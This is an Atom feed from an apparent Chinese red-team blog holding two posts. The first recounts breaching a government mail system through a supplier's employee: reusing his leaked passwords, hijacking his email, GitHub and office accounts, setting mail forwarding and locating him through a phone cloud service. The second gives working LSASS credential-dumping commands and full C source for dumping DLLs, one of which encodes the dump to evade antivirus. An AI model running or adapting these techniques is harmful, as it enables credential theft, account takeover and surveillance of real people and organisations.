<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://redteamblog.icu</id>
    <title>毅种循环的洗剑录</title>
    <updated>2022-05-08T09:31:32.768Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://redteamblog.icu"/>
    <link rel="self" href="https://redteamblog.icu/atom.xml"/>
    <subtitle>&lt;br&gt;西郊有密林，助君出重围。&lt;br&gt;
&lt;br&gt;Information Safety/Redteam/Moyu&lt;br&gt;</subtitle>
    <logo>https://redteamblog.icu/images/avatar.png</logo>
    <icon>https://redteamblog.icu/favicon.ico</icon>
    <rights>All rights reserved 2022, 毅种循环的洗剑录</rights>
    <entry>
        <title type="html"><![CDATA[记一次供应商到目标之旅]]></title>
        <id>https://redteamblog.icu/post/gongyingshangmanyou/</id>
        <link href="https://redteamblog.icu/post/gongyingshangmanyou/">
        </link>
        <updated>2022-05-08T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<p>因涉及敏感信息较多，厚码见谅。</p>
<p>最近一段时间有个项目，当时对某个单位目标进行了信息收集，该系统是一个邮件系统。</p>
<p>目标：XXX.gov.cn 某个政务级目标</p>
<p>系统：自建的邮件服务系统</p>
<p>系统有滑块验证，因此从web爆破邮箱的作用不大，同时，服务端也没有真实IP可以走协议爆破。</p>
<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/image-20220419164724-f9ybj9g.png" alt="image.png" loading="lazy"></figure>
<p>然后对该系统进行了信息收集，同时利用天眼查查询到目标所属资产的供应商为XXXX公司。该公司承包了该市级单位绝大部分的第三方系统开发，属于是很有价值的供应商，随即改变想法准备去从供应商下手。</p>
<h2 id="0x2-供应商信息收集">0x2 供应商信息收集</h2>
<p>XX科技</p>
<p>网址：testteam.com</p>
<p>法人邮箱：188888888@qq.com</p>
<p>法人手机号：18888888888</p>
<p>下属公司</p>
<p>XXX()科技</p>
<p>网址：1.testteam.com</p>
<p>法人邮箱：13333333@qq.com</p>
<p>法人手机号：13333333333</p>
<p>能从公开渠道查到的信息就只有这些，把收集到来的信息资产做了个查询，发现没啥可以利用的点，决定还是从网站入手。</p>
<p>扫描域名，只获得了一个IP，查询历史解析也没有多余的的IP，对这个IP进行全端口扫描，对外开放IP只有3389和443、80这种端口，而且是云服务器，子域名也没有多余的资产。</p>
<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/image-20220507095839-3f2kc1s.png" alt="image.png" loading="lazy"></figure>
<p>不过发现网站目录中提供了一个OA登录的接口</p>
<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/image-20220507100034-y3o6p37.png" alt="image.png" loading="lazy"></figure>
<p>利用弱口令登录尝试，输入账号后返回空白，但实际上是登录成功了的。</p>
<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/image-20220507101002-te227r1.png" alt="image.png" loading="lazy"></figure>
<p>不过登录流程逻辑可能有点问题，需要手动改请求和访问路径才可以到后台。</p>
<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/image-20220507101104-d8r94vn.png" alt="image.png" loading="lazy"></figure>
<p>到了供应商后台也没有发现什么信息，资产又少，所以决定从员工下手。</p>
<p>众所周知，github的开发者常常喜欢放一些项目资料上去，一些脚本中的泄露账号密码此类的，于是我在GitHub上收集了到了疑似该公司的人。</p>
<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/image-20220507101722-5ch8s16.png" alt="image.png" loading="lazy"></figure>
<p>他的项目仓库里面存有该公司的手册，同时我在另外一个项目找到了他的一个书签和口令密码，决定深挖此员工。</p>
<h2 id="0x3-员工信息收集">0x3 员工信息收集</h2>
<p>从他的项目代码来看，不少都是本地的localhostIP,不过有个别的书签地址引起了我的注意，其中一个是小米官网。</p>
<p>根据现有的资产，该员工分别使用三个邮箱，分别为新浪和QQ，猜中他主要使用哪个邮箱也很容易，比如，查查小米的绑定。</p>
<figure data-type="image" tabindex="7"><img src="https://redteamblog.icu/post-images/assets/image-20220507102405-ik2cyr0.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://redteamblog.icu/post-images/assets/image-20220507102420-6ljkq13.png" alt="image.png" loading="lazy"></figure>
<p>利用找回密码功能获得小米的绑定邮箱，同时也获取到了该员工常用的邮箱。</p>
<p>利用之前获取到的口令使用网易邮箱大师登录网易邮箱，简略看了一下往来邮件，没啥太大的价值，为了避免后面打草惊蛇，给邮箱设置转发控下该邮箱。</p>
<figure data-type="image" tabindex="9"><img src="https://redteamblog.icu/post-images/assets/image-20220507103010-aopi1y9.png" alt="image.png" loading="lazy"></figure>
<p>随即使用该邮箱登录小米账号。</p>
<figure data-type="image" tabindex="10"><img src="https://redteamblog.icu/post-images/assets/image-20220507103813-yhdxbnu.png" alt="image.png" loading="lazy"></figure>
<p>从个人收货地址获得了真实姓名和物理地址，确定了是属于该公司的物理地址，随即使用小米云服务定位到个人。</p>
<figure data-type="image" tabindex="11"><img src="https://redteamblog.icu/post-images/assets/image-20220507104139-pu33928.png" alt="image.png" loading="lazy"></figure>
<p>接着利用邮件中的地址，登录51job查看该员工简历。</p>
<figure data-type="image" tabindex="12"><img src="https://redteamblog.icu/post-images/assets/image-20220507104435-kuz5onm.png" alt="image.png" loading="lazy"></figure>
<p>也从该员工的历史信息中确定曾经在在目标公司的员工。</p>
<p>同时，从QQ邮箱中获取到了一些平台的账号。</p>
<figure data-type="image" tabindex="13"><img src="https://redteamblog.icu/post-images/assets/image-20220507104902-mu33ze1.png" alt="image.png" loading="lazy"></figure>
<p>从这些平台中登录了几个平台，不过都与目标无关系。</p>
<figure data-type="image" tabindex="14"><img src="https://redteamblog.icu/post-images/assets/image-20220507104947-a3te48i.png" alt="image.png" loading="lazy"></figure>
<p>这个时候我已经在思考一个问题了，就是我拿了这么多信息，但是目标公司的OA，或者是内部交流使用什么渠道还不得知，无法从个人打到内部上去，内部肯定有一个通讯的地方，但是到目前为止，除了刚开始看到的技能手册，还没有看到该公司的任何信息，单纯的收集一些这种信息没啥用。</p>
<h2 id="0x4-协同软件信息收集">0x4 协同软件信息收集</h2>
<p>1.腾讯文档</p>
<p>2.金山办公</p>
<p>3.钉钉</p>
<p>4.语雀</p>
<p>5.企业微信</p>
<p>6.微云</p>
<p>7.飞书</p>
<p>第二天，我依然坚持不懈的去找供应商的信息。</p>
<p>我在想既然官网没有业务或者OA，那么他们用什么平台去交流或者通讯呢？</p>
<p>这里我尝试了语雀/飞书/有道云笔记/钉钉/印象笔记/WPS此类的软件，经过几次尝试后，大部分账号我都可以用获取到的口令登录，钉钉和企业微信我都可以登录，但是都需要手机号验证，也许用的是两个中的一种，没得搞。</p>
<figure data-type="image" tabindex="15"><img src="https://redteamblog.icu/post-images/assets/image-20220507113125-q2bn7rk.png" alt="image.png" loading="lazy"></figure>
<p>语雀和腾讯文档都没写啥东西，没得搞。</p>
<figure data-type="image" tabindex="16"><img src="https://redteamblog.icu/post-images/assets/image-20220507110040-35iqsch.png" alt="image.png" loading="lazy"></figure>
<p>微云除了个人资料之外，没有任何公司的信息，也没啥用。</p>
<p>那么只剩下WPS了。</p>
<p>这个时候比较有意思的来了，金山文档多多少少肯定有在使用的，我用他的账号去重置为他的常用密码即可，因为他的密码规律都差不多，我赌他自己发现密码错了拿常用密码试进去了不会多想。</p>
<p>但是呢，这个WPS的修改密码一直没有发到我的转发邮箱里面来，然后使用了github绑定的QQ+常用密码试进去了一个。</p>
<figure data-type="image" tabindex="17"><img src="https://redteamblog.icu/post-images/assets/image-20220507110135-axmjd5w.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="18"><img src="https://redteamblog.icu/post-images/assets/image-20220507110236-n6ivwuj.png" alt="image.png" loading="lazy"></figure>
<p>登录进去之后，yes！ 终于有目标资产的信息了，是一份公司的员工通讯录名单。</p>
<figure data-type="image" tabindex="19"><img src="https://redteamblog.icu/post-images/assets/image-20220507110442-5nptvan.png" alt="image.png" loading="lazy"></figure>
<p>其实搞到这里就没准备搞了，因为确定不了目标使用的通讯平台，目标资产又较少，从员工打下去也不好说，接着从员工突破下去极有可能是徒劳的耗费时间。</p>
<p>想想从员工搞过来这条路，运气蛮好的，凡是邮箱设置了一个二次登录验证或者他密码规则改强一点，都拿不到这份通讯录，这个员工基本上啥信息都拿到了，我感觉可能使用的是钉钉，但是钉钉需要刷人脸登录。</p>
<h2 id="0x5-拿到目标">0x5 拿到目标</h2>
<p>搞到这里我就开始反思，这条路似乎是拿不下来目标了，一没拿到源码，二是没有拿到系统的密码，供应商也没有较大的突破。</p>
<p>看他使用github的比较多，我决定修改他的GitHub密码去翻仓库代码。</p>
<p>使用刚开始控制的新浪邮箱修改了他密码为他的常用口令，登录成功。</p>
<figure data-type="image" tabindex="20"><img src="https://redteamblog.icu/post-images/assets/image-20220507111111-8ynsb23.png" alt="image.png" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://redteamblog.icu/post-images/assets/image-20220507112012-xgdu7r7.png" alt="image.png" loading="lazy"></figure>
<p>在查看他的所有仓库代码的时候，意外的找到了目标系统的一个口令，密码是一个常见的密码，账号比较长，属于是运气极佳了。</p>
<p>使用该账号登录成功，并且还是管理员属性。</p>
<figure data-type="image" tabindex="22"><img src="https://redteamblog.icu/post-images/assets/image-20220507111637-629wtsp.png" alt="image.png" loading="lazy"></figure>
<p>最终拿到后台权限。</p>
<h2 id="0x6-总结">0x6 总结</h2>
<p>没啥技术的一次渗透，运气是第一要素，环环相扣，干就完了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[一些获取Windows明文凭据的方法]]></title>
        <id>https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/</id>
        <link href="https://redteamblog.icu/post/41016eb03b2343a69a9be35f251f1e9c/">
        </link>
        <updated>2022-04-29T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一些获取windows明文凭据的方法">一些获取Windows明文凭据的方法</h1>
<ul>
<li><a href="https://loong716.top/posts/lsass/#0x00-%E6%96%B9%E6%B3%95">0x00 方法</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-mimikatz%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96lsass">1. Mimikatz直接读取Lsass</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E7%AD%BE%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6dump">2. 签名/白名单文件Dump</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-avdumpexe">(1) AvDump.exe</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-createdumpexe">(2) CreateDump.exe</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-rundll32exe">(3) Rundll32.exe</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#3-%E5%88%A9%E7%94%A8silentprocessexit%E8%BF%9B%E8%A1%8Cdump">3. 利用SilentProcessExit进行Dump</a></li>
<li><a href="https://loong716.top/posts/lsass/#4-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84ssp">4. 添加自定义的SSP</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E4%BD%BF%E7%94%A8memssp%E5%AF%B9lsass%E8%BF%9B%E8%A1%8Cpatch">(1) 使用MemSSP对lsass进行patch</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E4%BD%BF%E7%94%A8addsecuritypackage%E5%8A%A0%E8%BD%BDssp">(2) 使用AddSecurityPackage加载SSP</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-%E9%80%9A%E8%BF%87rpc%E5%8A%A0%E8%BD%BDssp">(3) 通过RPC加载SSP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x01-%E5%AE%9E%E7%8E%B0">0x01 实现</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%96%E5%86%99dump-lsass%E7%9A%84dll">1. 编写Dump Lsass的DLL</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-%E5%B0%86dll%E4%B8%8Eexe%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85">2. 将DLL与EXE文件打包</a></li>
<li><a href="https://loong716.top/posts/lsass/#3-%E5%B0%86%E8%BF%9B%E7%A8%8Bdump%E5%88%B0%E5%86%85%E5%AD%98">3. 将进程dump到内存</a></li>
<li><a href="https://loong716.top/posts/lsass/#4-x86%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8rpc%E5%8A%A0%E8%BD%BDssp">4. x86环境下利用RPC加载SSP</a></li>
<li><a href="https://loong716.top/posts/lsass/#5-%E5%85%B6%E5%AE%83%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E7%9A%84%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF">5. 其它可能用到的优化思路</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x02-%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98">0x02 可能遇到的问题</a>
<ul>
<li><a href="https://loong716.top/posts/lsass/#1-%E7%BC%BA%E5%B0%91vc%E8%BF%90%E8%A1%8C%E5%BA%93">1. 缺少VC运行库</a></li>
<li><a href="https://loong716.top/posts/lsass/#2-dump%E6%96%87%E4%BB%B6%E4%BD%93%E7%A7%AF%E8%BF%87%E5%A4%A7">2. dump文件体积过大</a></li>
</ul>
</li>
<li><a href="https://loong716.top/posts/lsass/#0x03-%E6%80%BB%E7%BB%93">0x03 总结</a></li>
</ul>
<p>获取Windows用户的凭证信息是渗透过程中至关重要的一步，与杀软的对抗也在不断升级</p>
<p>本文对常见的Dump Lsass/获取明文凭据的方法进行简单的总结，以应对实战中各种各样的场景</p>
<h2 id="0x00-方法">0x00 方法</h2>
<h3 id="1-mimikatz直接读取lsass">1. Mimikatz直接读取Lsass</h3>
<blockquote>
<p>优点：</p>
<ul>
<li>方便快捷</li>
</ul>
<p>缺点：</p>
<ul>
<li>mimikatz必须免杀</li>
<li>无法绕过部分AV对lsass的监控</li>
</ul>
</blockquote>
<p>经典姿势，使用mimikatz的<code>sekurlsa::logonpasswords</code></p>
<p>其实是调用<code>ReadProcessMemory</code>来将lsass进程读入内存中的另一个地址中，然后对进程进行解析：</p>
<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" alt="https://i.loli.net/2021/03/27/EspZH8xKkmwj3Uc.png" loading="lazy"></figure>
<h3 id="2-签名白名单文件dump">2. 签名/白名单文件Dump</h3>
<blockquote>
<p>优点：</p>
<ul>
<li>程序拥有合法签名</li>
<li>远程Dump后下载到本地离线解析，减少特征</li>
</ul>
<p>缺点：</p>
<ul>
<li>虽然有签名但部分AV仍会发出警告</li>
<li>无法绕过部分AV对lsass的监控</li>
<li>dump得到的内存转储文件可能触发报警</li>
</ul>
</blockquote>
<p>主要有以下几个程序：</p>
<ol>
<li>Procdump.exe</li>
<li>SqlDumper.exe</li>
<li>AvDump.exe</li>
<li>createdump.exe</li>
<li>rundll32.exe</li>
</ol>
<p>其中1、2、4这三个工具是有微软签名的，3是有杀软厂商Avast的签名，rundll32这个LOLBIN就不用说了</p>
<p>前两个工具的用法已经是老生常谈了，网上也有很多文章，主要讨论后三个</p>
<p>**PS：**注意使用这些工具的时候最好是system权限，如果是administrator的话要注意是否有<code>SeDebugPrivilege</code>，如果没有的话可以在命令前使用<code>powershell -c</code></p>
<h3 id="1-avdumpexe">(1) AvDump.exe</h3>
<p>AvDump.exe是杀软Avast自带的一个程序，该程序可以用来dump进程的内存，拥有Avast的签名</p>
<pre><code>.\AvDump.exe --pid &lt;lsass pid&gt; --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\Users\admin\Desktop\lsass.dmp --min_interval 0

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" alt="https://i.loli.net/2021/03/27/pWHXrZV5wutbvSO.png" loading="lazy"></figure>
<h3 id="2-createdumpexe">(2) CreateDump.exe</h3>
<blockquote>
<p>createdump.exe随着.NET5出现的，本身是个native binary</p>
</blockquote>
<p>虽然createdump.exe是随着.NET5出现的，但因为它是native binary，所以执行时并不需要依赖.NET5的环境</p>
<pre><code>createdump.exe -u -f lsass.dmp &lt;lsass pid&gt;

</code></pre>
<h3 id="3-rundll32exe">(3) Rundll32.exe</h3>
<p>其实就是使用rundll32直接执行comsvcs.dll的导出函数<code>MiniDump</code>来Dump进程内存</p>
<pre><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\admin\Desktop\lsass-comsvcs.dmp full

</code></pre>
<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" alt="https://i.loli.net/2021/03/27/l1KjZJ3BINMXu4Q.png" loading="lazy"></figure>
<h3 id="3-利用silentprocessexit进行dump">3. 利用SilentProcessExit进行Dump</h3>
<blockquote>
<p>优点：</p>
<ul>
<li>系统正常行为</li>
</ul>
<p>缺点：</p>
<ul>
<li>需要写注册表</li>
</ul>
</blockquote>
<p>很久之前看到过让系统蓝屏，然后通过windbg调试系统崩溃文件来读取lsass进程，但个人感觉这种方法风险过大，并且产生的崩溃文件的体积非常大，在实战中的应用情况有限</p>
<p>直到不久前看到了一篇文章使用SilentProcessExit来使lsass静默退出，进而dump进程内存的方法，具体原理可以看文章：</p>
<p><a href="https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w">利用SilentProcessExit机制dump内存</a></p>
<blockquote>
<p>Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。</p>
</blockquote>
<p>实际测试中，该方法确实可以dump lsass的进程内存</p>
<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" alt="https://i.loli.net/2021/03/27/iPhRcXFmG2jgOHy.png" loading="lazy"></figure>
<p>但在卡巴斯基环境下，不会报警但dump文件为0kb(猜测是卡巴拒绝系统行为转储lsass进程)</p>
<p>而遇到defender+360的情况下，同样不会触发报警，但该程序无法修改注册表项</p>
<h3 id="4-添加自定义的ssp">4. 添加自定义的SSP</h3>
<h3 id="1-使用memssp对lsass进行patch">(1) 使用MemSSP对lsass进行patch</h3>
<blockquote>
<p>优点：</p>
<ul>
<li>不需要重启服务器</li>
<li>Lsass进程中不会出现可疑的DLL</li>
</ul>
<p>缺点：</p>
<ul>
<li>需要调用WriteProcessMemory对lsass进行操作，可能会被标记</li>
</ul>
</blockquote>
<p>该方法的大概原理是，通过打开lsass进程的句柄，然后搜索<code>msv1_0.dll</code>（支持交互式身份验证的DLL），找到之后对其中的<code>SpAcceptCredentials</code>函数进行hook，当用户进行认证时在<code>SpAcceptCredentials</code>函数第一行会首先<code>jmp</code>到我们的函数，将凭证写入文件后再跳回原函数</p>
<p>当我们执行后，尝试用户身份认证，可以看到密码被记录在mimilsa.txt中：</p>
<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" alt="https://i.loli.net/2021/03/27/uR1vOQV8gI3kUNa.png" loading="lazy"></figure>
<p>lsass的进程中并不存在异常的DLL：</p>
<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" alt="https://i.loli.net/2021/03/27/li3oWywEYeKbUnT.png" loading="lazy"></figure>
<h3 id="2-使用addsecuritypackage加载ssp">(2) 使用AddSecurityPackage加载SSP</h3>
<blockquote>
<p>优点：</p>
<ul>
<li>可以绕过部分杀软对lsass的监控</li>
<li>可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况</li>
<li>不需要重启服务器</li>
</ul>
<p>缺点：</p>
<ul>
<li>需要写注册表</li>
<li>需要将SSP的dll拷贝到system32下（这个说缺点似乎也谈不上）</li>
<li>Blue Team可以通过枚举SSP来发现我们自定义的SSP，并且lsass进程中可以看到加载的DLL</li>
</ul>
</blockquote>
<p>SSP和SSPI的知识就不谈了，添加SSP需要以下操作：</p>
<ol>
<li>将mimilib.dll复制到<code>c:\windows\system32</code>下</li>
<li>将<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\</code>处Security Packages的值设置为mimilib.dll</li>
<li>调用<code>AddSecurityPackage</code>添加SSP</li>
</ol>
<p>相关代码可以参考：<a href="https://github.com/lengjibo/RedTeamTools/blob/master/windows/CredSSP/CredSSP/CredSSP.cpp">CredSSP</a></p>
<p>这里直接使用**@lengyi**师傅的代码，运行后会将存放在资源区的mimilib.dll释放到当前目录，然后移动到system32下，修改注册表，最终调用<code>AddSecurityPackage</code>添加ssp：</p>
<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" alt="https://i.loli.net/2021/03/27/rSx41WZYDa7gU62.png" loading="lazy"></figure>
<p>可以看到lsass进程加载了mimilib.dll：</p>
<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" alt="https://i.loli.net/2021/03/27/DldwTOUJGg4nWhr.png" loading="lazy"></figure>
<h3 id="3-通过rpc加载ssp">(3) 通过RPC加载SSP</h3>
<blockquote>
<p>优点：</p>
<ul>
<li>可以绕过杀软对lsass的监控</li>
<li>可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况</li>
<li>不需要重启服务器</li>
<li>不需要写注册表</li>
</ul>
<p>缺点：</p>
<ul>
<li>因为没有写注册表，所以无法持久化，如果目标机器重启的话将无法记录密码（因此个人认为比较适合在Server上用，不适合在PC上用）</li>
</ul>
</blockquote>
<p>可以参考xpn关于mimikatz的系列文章：</p>
<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">exploring-mimikatz-part-1</a></p>
<p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">exploring-mimikatz-part-2</a></p>
<p>原理简单的来讲就是，xpn发现<code>AddSecurityPackage()</code>在被调用时会使用RPC（xpn的原文中说到：这是有道理的，因为这一调用需要向lsass发出信号来表明需要加载新的SSP）</p>
<p>因此可以通过调试获取传递给RPC的数据，进而可以发起RPC调用，而不用使用<code>AddSecurityPackage()</code>这个API去调用</p>
<p>加载的dll可以是直接dump lsass的，也可以是加载mimilib这种记录密码的</p>
<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" alt="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" loading="lazy"></figure>
<h2 id="0x01-实现">0x01 实现</h2>
<p>一些Dump Lsass方法or技巧的简单实现，以及实战中的一些优化</p>
<h3 id="1-编写dump-lsass的dll">1. 编写Dump Lsass的DLL</h3>
<p>需要以下几步操作：</p>
<ol>
<li>获取Debug权限</li>
<li>找到lsass的PID</li>
<li>使用MiniDump或MiniDumpWriteDump进行内存dump</li>
</ol>
<p>这个逻辑很简单，其中获取debug权限和自动寻找lsass的PID网上也有不少的Demo，所以很好实现</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;tlhelp32.h&gt;

typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;entry)) {
		while (Process32Next(hSnapshot, &amp;entry)) {
			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
}

void DumpLsass()
{
	wchar_t  ws[100];
	_MiniDumpW MiniDumpW;
	
	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L&quot;comsvcs.dll&quot;), &quot;MiniDumpW&quot;);
	swprintf(ws, 100, L&quot;%u %hs&quot;, GetLsassPid(), &quot;c:\\windows\\temp\\temp.bin full&quot;);

	GetDebugPrivilege();

	MiniDumpW(0, 0, ws);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DumpLsass();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>我们先拿rundll32测试一下，成功dump了lsass进程：</p>
<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" alt="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" loading="lazy"></figure>
<p>然后使用利用RPC加载SSP的方式来转储lsass的进程内存：</p>
<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" alt="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" loading="lazy"></figure>
<p>成功绕过卡巴斯基对lsass的监控</p>
<h3 id="2-将dll与exe文件打包">2. 将DLL与EXE文件打包</h3>
<p>我们在使用该方法时需要上传exe和dll，并且XPN原版的代码需要将SSP DLL的绝对路径作为参数传入，在使用时非常不方便</p>
<p>因此我们可以将DLL放入exe的资源节区，然后在运行时释放到程序所在目录，加载完成后再删除DLL</p>
<p>成功dump lsass进程的内存：</p>
<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" alt="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" loading="lazy"></figure>
<p>关于将文件添加到资源区并释放可以参考：<a href="https://blog.csdn.net/dengdao1372/article/details/101230640">C++实现第三方资源释放与载入过程（以DLL为例）</a></p>
<h3 id="3-将进程dump到内存">3. 将进程dump到内存</h3>
<p>部分AV/EDR会监控我们dump下来的进程转储文件，因此我们有时需要将进程dump到一块内存中，进行加密后再写入磁盘，或者直接通过网络进行传输</p>
<p>主要利用的是<code>MiniDumpWriteDump</code>的回调函数来实现该操作</p>
<p>我这里借鉴了<code>@ired.team</code>的代码（<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks">文章戳这里</a>），并在内存中对进程转储数据进行与<code>0x32</code>的按位异或，通过编译为dll然后使用rundll32加载</p>
<pre><code class="language-c">// dllmain.cpp : Defines the entry point for the DLL application.
#include &quot;pch.h&quot;
#include &lt;windows.h&gt;
#include &lt;DbgHelp.h&gt;
#include &lt;iostream&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;processsnapshot.h&gt;
#pragma comment (lib, &quot;Dbghelp.lib&quot;)

LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;entry)) {
		while (Process32Next(hSnapshot, &amp;entry)) {
			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
}

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput-&gt;CallbackType)
	{
	case IoStartCallback:
		callbackOutput-&gt;Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput-&gt;Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput-&gt;Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
